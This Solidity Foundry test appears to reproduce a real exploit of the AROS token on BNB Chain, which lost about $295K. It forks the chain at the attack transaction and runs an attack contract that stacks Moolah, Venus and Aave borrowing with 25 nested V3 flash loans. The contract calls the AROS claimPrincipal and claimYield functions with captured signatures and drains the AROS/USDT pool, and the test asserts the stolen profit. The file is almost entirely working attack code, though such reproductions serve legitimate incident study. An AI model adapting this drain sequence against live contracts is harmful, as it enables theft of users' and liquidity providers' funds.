// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~$295K
// Attacker : https://bscscan.com/address/0x6f548693937039C8C4343E01C5bd42c5986508f5
// Attack Contract : https://bscscan.com/address/0x240F473a094096b4FB41d480Ca57a7cc22c924e5
// Vulnerable Contract : https://bscscan.com/address/0xFEC7D27525cC4efDe5b785EEb5E37Df90E9cd1d5
// Attack Tx : https://bscscan.com/tx/0xe89fe640ec5241edfca7d8dcae77a0a4270dee15e4bbd043fc60e393aabf41e1
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xFEC7D27525cC4efDe5b785EEb5E37Df90E9cd1d5#code
//
// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/2061289921990570349

contract AROSTest is Test {
    bytes32 internal constant TX_HASH = 0xe89fe640ec5241edfca7d8dcae77a0a4270dee15e4bbd043fc60e393aabf41e1;
    string internal constant DEFAULT_BSC_RPC_URL = "https://bsc-mainnet.public.blastapi.io";
    address internal constant ATTACKER = 0x6f548693937039C8C4343E01C5bd42c5986508f5;

    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 internal constant AROS_USDT_LP = IERC20(0x3104d26Ae74B49EEc61675a873b38414329c5edd);

    uint256 internal constant EXPECTED_USDT_BALANCE = 295_347_995_453_652_905_255_125;
    uint256 internal constant EXPECTED_USDT_PROFIT = 295_314_043_814_755_023_404_189;
    uint256 internal constant EXPECTED_LP_USDT_BALANCE = 2_841_360_035_403;
    uint256 internal constant MIN_USDT_PROFIT = 295_000e18;

    AROSAttackImplementation internal implementation;

    function setUp() public {
        vm.createSelectFork(vm.envOr("BSC_RPC_URL", DEFAULT_BSC_RPC_URL), TX_HASH);

        implementation = new AROSAttackImplementation();
        vm.etch(ATTACKER, abi.encodePacked(hex"ef0100", address(implementation)));
        vm.setNonceUnsafe(ATTACKER, 27);

        vm.label(ATTACKER, "Attacker");
        vm.label(address(implementation), "Local source-level EIP-7702 implementation");
        vm.label(address(USDT), "USDT");
        vm.label(address(AROS_USDT_LP), "AROS/USDT LP");
    }

    function testExploit() public {
        uint256 beforeAttackerUsdt = USDT.balanceOf(ATTACKER);
        uint256 beforeLpUsdt = USDT.balanceOf(address(AROS_USDT_LP));

        vm.prank(ATTACKER, ATTACKER);
        AROSAttackImplementation(payable(ATTACKER)).attack();

        uint256 usdtProfit = USDT.balanceOf(ATTACKER) - beforeAttackerUsdt;
        uint256 lpUsdtDrain = beforeLpUsdt - USDT.balanceOf(address(AROS_USDT_LP));

        assertEq(USDT.balanceOf(ATTACKER), EXPECTED_USDT_BALANCE, "USDT balance drift");
        assertEq(usdtProfit, EXPECTED_USDT_PROFIT, "USDT profit drift");
        assertEq(USDT.balanceOf(address(AROS_USDT_LP)), EXPECTED_LP_USDT_BALANCE, "LP USDT drift");
        assertGt(usdtProfit, MIN_USDT_PROFIT, "USDT profit low");
        assertGt(lpUsdtDrain, MIN_USDT_PROFIT, "LP was not drained");

        console.log("Stolen USDT", usdtProfit);
    }
}

contract AROSAttackImplementation {
    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IWBNB internal constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IAROS internal constant AROS = IAROS(0xFEC7D27525cC4efDe5b785EEb5E37Df90E9cd1d5);

    address internal constant MOOLAH = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
    address internal constant VENUS_COMPTROLLER = 0xfD36E2c2a6789Db23113685031d7F16329158384;
    address internal constant VUSDT = 0xfD5840Cd36d94D7229439859C0112a4185BC0255;
    address internal constant VWBNB = 0x6bCa74586218dB34cdB402295796b79663d816e9;
    address internal constant BALANCER_LOCK = 0x238a358808379702088667322f80aC48bAd5e6c4;
    address internal constant AAVE_POOL = 0x6807dc923806fE8Fd134338EABCA509979a7e0cB;
    address internal constant AWBNB = 0x9B00a09492a626678E5A3009982191586C444Df9;
    address internal constant DEBT_USDT = 0xa9251ca9DE909CB71783723713B21E4233fbf1B1;
    address internal constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant FEE_RECEIVER = 0xECbF62c834A09559FFD044A75F4E46e53Df62Eed;
    address internal constant REFERRAL_POOL = 0x663FEA9A146645A4f6D8ca92B0329D9d8526782F;
    address internal constant DIVIDEND_POOL = 0x6f8099E4c83700AF10E657289d02bC86Ce2E25c1;

    uint256 internal constant WBNB_FLASH_AMOUNT = 427_489_387_531_280_866_628_851;
    uint256 internal constant USDT_FLASH_AMOUNT = 15_089_844_448_880_871_918_088_002;
    uint256 internal constant VENUS_WBNB_SUPPLY = 392_489_387_531_280_866_628_851;
    uint256 internal constant VENUS_USDT_BORROW = 85_842_934_250_710_145_255_519_143;
    uint256 internal constant AAVE_WBNB_SUPPLY = 35_000_000_000_000_000_000_000;
    uint256 internal constant AAVE_USDT_BORROW = 13_129_939_200_815_019_480_553_986;
    uint256 internal constant AAVE_USDT_REPAY = 13_129_939_200_815_019_480_554_086;
    uint256 internal constant AAVE_WBNB_WITHDRAW = 34_999_999_999_999_999_999_900;
    uint256 internal constant VAULT_USDT_AMOUNT = 35_301_663_737_991_795_262_359_069;
    uint256 internal constant DEADLINE = 1_780_165_447;

    bytes32 internal constant PRINCIPAL_SIG_R = 0x608ecaa26c203101fd5fde9949d0839f01a18d69cfbc49792c4e2acef9183f6f;
    bytes32 internal constant PRINCIPAL_SIG_S = 0x36b5d160437068014a3cb9a71b54cc558f3b921ee8f1003ae4d89528939952bc;
    uint8 internal constant PRINCIPAL_SIG_V = 27;
    bytes32 internal constant YIELD_SIG_R = 0x4b59e2a24fafa3ac82b161c425b0a00b3b146e49acc1c39b96917bfdbd95f46c;
    bytes32 internal constant YIELD_SIG_S = 0x7532578b6489133580ba1351600d0fc7d76449f65e55ecc42b136eef2d23265f;
    uint8 internal constant YIELD_SIG_V = 27;

    function attack() external payable {
        IERC20(address(WBNB)).approve(MOOLAH, type(uint256).max);
        USDT.approve(MOOLAH, type(uint256).max);
        USDT.approve(BALANCER_LOCK, type(uint256).max);
        IERC20(VUSDT).approve(VUSDT, type(uint256).max);
        IERC20(VWBNB).approve(VWBNB, type(uint256).max);
        IERC20(address(WBNB)).approve(VWBNB, type(uint256).max);
        USDT.approve(VUSDT, type(uint256).max);

        WBNB.deposit{value: 200}();
        IMoolah(MOOLAH).flashLoan(address(WBNB), WBNB_FLASH_AMOUNT, abi.encode(uint256(0)));
        USDT.transfer(address(this), USDT.balanceOf(address(this)));
    }

    function onMoolahFlashLoan(uint256, bytes calldata data) external {
        require(msg.sender == MOOLAH, "bad Moolah lender");

        if (data.length == 32 && abi.decode(data, (uint256)) == 3) {
            address[] memory markets = new address[](2);
            markets[0] = VWBNB;
            markets[1] = VUSDT;
            IVenusComptroller(VENUS_COMPTROLLER).enterMarkets(markets);
            IVToken(VWBNB).mint(VENUS_WBNB_SUPPLY);
            IVToken(VUSDT).borrow(VENUS_USDT_BORROW);

            IERC20(address(WBNB)).approve(AAVE_POOL, type(uint256).max);
            IERC20(address(WBNB)).approve(AWBNB, type(uint256).max);
            USDT.approve(AAVE_POOL, type(uint256).max);
            IERC20(AWBNB).approve(AAVE_POOL, type(uint256).max);
            IERC20(DEBT_USDT).approve(AAVE_POOL, type(uint256).max);

            IAavePool(AAVE_POOL).supply(address(WBNB), AAVE_WBNB_SUPPLY, address(this), 0);
            IAavePool(AAVE_POOL).borrow(address(USDT), AAVE_USDT_BORROW, 2, 0, address(this));
            IBalancerLock(BALANCER_LOCK).lock(abi.encode(uint256(0)));
            IVToken(VUSDT).repayBorrow(VENUS_USDT_BORROW);
            IVToken(VWBNB).redeemUnderlying(VENUS_WBNB_SUPPLY);
            IAavePool(AAVE_POOL).repay(address(USDT), AAVE_USDT_REPAY, 2, address(this));
            IAavePool(AAVE_POOL).withdraw(address(WBNB), AAVE_WBNB_WITHDRAW, address(this));
        } else {
            IMoolah(MOOLAH).flashLoan(address(USDT), USDT_FLASH_AMOUNT, abi.encode(uint256(3)));
        }
    }

    function lockAcquired(bytes calldata) external returns (bytes memory) {
        require(msg.sender == BALANCER_LOCK, "bad lock");

        IBalancerLock(BALANCER_LOCK).take(address(USDT), address(this), VAULT_USDT_AMOUNT);
        _nextFlash(0);
        IBalancerLock(BALANCER_LOCK).sync(address(USDT));
        USDT.transfer(BALANCER_LOCK, VAULT_USDT_AMOUNT);
        IBalancerLock(BALANCER_LOCK).settle();
        return bytes("");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        _onV3FlashCallback(fee0, fee1, data);
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        _onV3FlashCallback(fee0, fee1, data);
    }

    function _onV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) internal {
        (uint256 amount, uint256 index) = abi.decode(data, (uint256, uint256));

        if (index == 24) {
            _drainArosPool();
        } else {
            _nextFlash(index + 1);
        }

        // The traced implementation over-repaid each V3 flash by one wei.
        USDT.transfer(msg.sender, amount + fee0 + fee1 + 1);
    }

    function _nextFlash(uint256 index) internal {
        (address pool, uint256 amount0, uint256 amount1) = _flashParams(index);
        IV3Pool(pool).flash(address(this), amount0, amount1, abi.encode(amount0 == 0 ? amount1 : amount0, index));
    }

    function _drainArosPool() internal {
        AROS.approve(ROUTER, type(uint256).max);
        USDT.approve(ROUTER, type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(AROS);
        IPancakeRouter(ROUTER).swapTokensForExactTokens(621_936_655_975_708_807_818_467_060, 209_019_505_601_362_420_848_039_825, path, FEE_RECEIVER, DEADLINE);

        AROS.claimPrincipal(
            1,
            3,
            199_269_156_103_688_477_492_300,
            1_780_166_180,
            abi.encodePacked(PRINCIPAL_SIG_R, PRINCIPAL_SIG_S, PRINCIPAL_SIG_V)
            );

        AROS.claimYield(
            1,
            3,
            568_633_093_525_179_856_115_100,
            REFERRAL_POOL,
            71_079_136_690_647_482_014_400,
            DIVIDEND_POOL,
            71_079_136_690_647_482_014_400,1_780_166_213,
            abi.encodePacked(YIELD_SIG_R, YIELD_SIG_S, YIELD_SIG_V
            ));

        path[0] = address(AROS);
        path[1] = address(USDT);
        IPancakeRouter(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(AROS.balanceOf(address(this)), 0, path, address(this), DEADLINE);
    }

    function _flashParams(uint256 index) internal pure returns (address pool, uint256 amount0, uint256 amount1) {
        if (index == 0) return (0x92b7807bF19b7DDdf89b706143896d05228f3121, 9_780_512_077_769_254_320_547_510, 0);
        if (index == 1) return (0xB67e5EaF770a384Ab28029d08B9bC5EBE32beb0F, 6_771_750_912_499_350_149_999_450, 0);
        if (index == 2) return (0xA0909f81785f87f3e79309F0E73A7d82208094E4, 8_832_341_022_962_096_328_942_297, 0);
        if (index == 3) return (0x9c4Ee895e4f6Ce07Ada631C508D1306Db7502cCE, 2_600_858_024_905_459_292_301_810, 0);
        if (index == 4) return (0x9F8f4615Ff5143aeE365fa34f34196fB85Be7650, 3_528_481_701_018_131_041_166_946, 0);
        if (index == 5) return (0x172fcD41E0913e95784454622d1c3724f546f849, 13_172_736_945_692_744_676_425_098, 0);
        if (index == 6) return (0x9F599F3D64a9D99eA21e68127Bb6CE99f893DA61, 0, 803_085_555_192_746_938_202_015);
        if (index == 7) return (0x4f3126d5DE26413AbDCF6948943FB9D0847d9818, 1_150_061_148_786_497_927_075_356, 0);
        if (index == 8) return (0x8F6ef959FA19173Bd4668B83E80F82442B2c99DE, 0, 51_097_702_973_354_286_878_587);
        if (index == 9) return (0xf4262C4dbF524f53851A5176bdC7D6C1e0fA82D8, 884_450_895_211_172_307_287_016, 0);
        if (index == 10) return (0xFa09940612D7Ae39F7F220f3Ca6816bd72844577, 623_753_507_086_978_825_919_884, 0);
        if (index == 11) return (0xef7D88D12b6393fE06f5F07d48d7B76511909e6b, 0, 1_108_129_428_636_275_123_369_649);
        if (index == 12) return (0x5bd808Ab85C124f99080da5F864EDcB39950edE5, 1_241_884_897_217_375_374_863_577, 0);
        if (index == 13) return (0xd21bc2291C1aeF340f5265E257B18aa5dafed759, 687_604_957_982_945_911_411_160, 0);
        if (index == 14) return (0x0022f0dcd574A1e646250eEbD086781823434504, 610_434_709_450_391_213_486_504, 0);
        if (index == 15) return (0x97620e003c03381EaCBDE7135F28d94303bb5672, 695_822_167_401_439_261_446_139, 0);
        if (index == 16) return (0xB4Db9FCdA97fd7B02eAf1e8317E6DdB04BaCC1AF, 1_138_238_683_349_544_207_806_736, 0);
        if (index == 17) return (0x2C3c320D49019D4f9A92352e947c7e5AcFE47D68, 353_566_373_796_907_685_246_877, 0);
        if (index == 18) return (0xDc85C2BB53D927006B2dB488a0CB4605fcA48032, 12_732_473_959_371_288_650_255, 0);
        if (index == 19) return (0xE1aCb466421eD24Dd8bd381D1205baD0ad43Ca9c, 0, 1_500_812_641_410_679_264_037_461);
        if (index == 20) return (0x1c3865814aCbBa11E7196dF0b46c024472503196, 1_299_265_137_133_810_290_441_314, 0);
        if (index == 21) return (0xA5DbEaf16Fc031eae92175974F8d0A439bE4aD17, 1_086_000_474_125_890_956_690_301, 0);
        if (index == 22) return (0xCA3F029A70d5d90000E614afD29E5c833f33CEa5, 675_533_943_817_186_776_292_296, 0);
        if (index == 23) return (0xeAA6C7292eD954CA9Dd72E769568D057B0525c9A, 0, 722_820_521_118_955_264_044_593);
        if (index == 24) return (0x24618d12b5eA15bB6fe3c81bBb9E011b5D5b107c, 323_114_107_827_132_337_135_858, 0);
    }
}

interface IWBNB is IERC20 {
    function deposit() external payable;
}

interface IMoolah {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
}

interface IVenusComptroller {
    function enterMarkets(address[] calldata vTokens) external returns (uint256[] memory);
}

interface IVToken is IERC20 {
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function repayBorrow(uint256 repayAmount) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
}

interface IAavePool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
        external;
    function repay(address asset, uint256 amount, uint256 interestRateMode, address onBehalfOf)
        external
        returns (uint256);
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
}

interface IBalancerLock {
    function lock(bytes calldata data) external returns (bytes memory result);
    function take(address token, address to, uint256 amount) external;
    function sync(address token) external;
    function settle() external returns (uint256 credit);
}

interface IV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IPancakeRouter {
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IAROS is IERC20 {
    function claimPrincipal(
        uint256 periodFrom,
        uint256 periodTo,
        uint256 amount,
        uint256 deadline,
        bytes calldata signature
    ) external;

    function claimYield(
        uint256 periodFrom,
        uint256 periodTo,
        uint256 userAmount,
        address referralPool,
        uint256 referralAmount,
        address dividendPool,
        uint256 dividendAmount,
        uint256 deadline,
        bytes calldata signature
    ) external;
}
